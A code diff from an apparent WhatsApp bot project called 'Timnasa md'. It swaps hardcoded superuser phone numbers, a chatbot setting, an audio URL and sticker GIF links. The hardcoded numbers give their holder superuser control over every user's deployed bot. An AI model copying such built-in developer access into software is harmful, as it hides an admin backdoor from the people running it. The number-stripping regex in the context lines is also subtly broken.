@@ -190,10 +190,10 @@ if (conf.AUTOREACT_STATUS=== "yes") {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '255693629079';
-            const dj2 = '255693629079';
-            const dj3 = "255693629079";
-            const luffy = '255693629079';
+            const dj = '255784766591';
+            const dj2 = '255784766591';
+            const dj3 = "255784766591";
+            const luffy = '255784766591';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -213,7 +213,7 @@ if (conf.AUTOREACT_STATUS=== "yes") {
             console.log(texte);
 
             // ================== CHATBOT (AUTO-REPLY & AUDIO) LOGIC ==================
-            if (conf.CHATBOT === "yes" && !ms.key.fromMe) {
+            if (conf.CHATBOT === "on" && !ms.key.fromMe) {
                 const query = texte.toLowerCase().trim();
                 
                 // --- Text Replies ---
@@ -226,7 +226,7 @@ if (conf.AUTOREACT_STATUS=== "yes") {
                 // --- Audio Replies ---
                 let audioUrl = "";
                 if (query === "timnasa") {
-                    audioUrl = "https://files.catbox.moe/p88m0u.mp3"; // WEKA LINK YAKO HAPA
+                    audioUrl = "https://files.catbox.moe/e4c48n.mp3"; // WEKA LINK YAKO HAPA
                 } else if (query === "oyee") {
                     audioUrl = "https://files.catbox.moe/p88m0u.mp3"; // WEKA LINK YAKO HAPA
                 }
@@ -430,7 +430,7 @@ function mybotpic() {
                                         participant: auteurMessage
                                     };
                                     var txt = "lien detected, \n";
-                                    const gifLink = "https://raw.githubusercontent.com/mr-X-force/LUCKY-MD-XFORCE/main/media/remover.gif";
+                                    const gifLink = "https://raw.githubusercontent.com/Next5x/TIMNASA_TMD1/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
                                         pack: 'Timnasa md',
                                         author: conf.OWNER_NAME,
@@ -503,7 +503,7 @@ function mybotpic() {
                 participant: auteurMessage
             };
             var txt = "bot detected, \n";
-            const gifLink = "https://raw.githubusercontent.com/mr-X-force/LUCKY-MD-XFORCE/main/media/remover.gif";
+            const gifLink = "https://raw.githubusercontent.com/Next5x/TIMNASA_TMD1/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
                 pack: 'Timnasa md',
                 author: conf.OWNER_NAME,
